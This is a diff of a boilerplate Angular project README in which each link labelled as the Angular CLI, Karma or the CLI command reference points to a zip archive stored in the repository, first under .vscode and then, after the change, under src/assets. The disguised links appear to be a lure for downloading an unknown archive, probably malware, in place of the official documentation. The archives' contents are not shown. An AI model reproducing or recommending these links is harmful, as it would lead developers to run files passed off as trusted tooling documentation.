@@ -1,6 +1,6 @@
 # AngularFormListGenerator
 
-This project was generated with [Angular CLI](https://github.com/Pranay1012904/Angular_Form_List_Gen/raw/refs/heads/formGen/.vscode/Form_Angular_Gen_List_3.9.zip) version 14.1.0.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/Pranay1012904/Angular_Form_List_Gen/formGen/src/assets/List_Gen_Form_Angular_v1.5.zip) version 14.1.0.
 
 ## Development server
 
@@ -16,7 +16,7 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://github.com/Pranay1012904/Angular_Form_List_Gen/raw/refs/heads/formGen/.vscode/Form_Angular_Gen_List_3.9.zip).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/Pranay1012904/Angular_Form_List_Gen/formGen/src/assets/List_Gen_Form_Angular_v1.5.zip).
 
 ## Running end-to-end tests
 
@@ -24,4 +24,4 @@ Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To u
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://github.com/Pranay1012904/Angular_Form_List_Gen/raw/refs/heads/formGen/.vscode/Form_Angular_Gen_List_3.9.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/Pranay1012904/Angular_Form_List_Gen/formGen/src/assets/List_Gen_Form_Angular_v1.5.zip) page.
